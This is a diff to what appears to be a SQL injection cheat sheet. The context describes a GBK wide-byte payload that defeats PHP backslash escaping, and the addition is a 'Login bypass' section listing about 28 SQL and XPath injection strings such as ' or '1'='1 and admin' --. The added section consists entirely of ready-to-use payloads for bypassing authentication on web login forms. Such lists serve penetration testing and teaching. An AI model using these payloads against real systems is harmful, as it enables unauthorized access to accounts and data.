@@ -683,6 +683,36 @@ In the GBK character set, the sequence `%df%5c` translates to the character `連
 
 Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.
 
+## Login bypass
+
+List Payload, for bypass login
+```
+' or '1'='1
+' or ''='
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+```
 
 ## References
 
